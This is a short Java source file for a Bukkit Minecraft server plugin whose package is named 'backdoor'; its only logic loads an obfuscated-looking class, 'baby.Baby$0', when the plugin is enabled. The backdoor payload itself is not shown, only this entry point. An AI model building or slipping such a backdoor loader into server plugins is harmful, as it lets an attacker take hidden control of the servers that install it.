package space.commandf1.backdoor;

import baby.Baby$0;
import org.bukkit.plugin.java.JavaPlugin;

@SuppressWarnings("all")
public class Main extends JavaPlugin {
    @Override
    public void onEnable() {
        new Baby$0(this);
    }
}
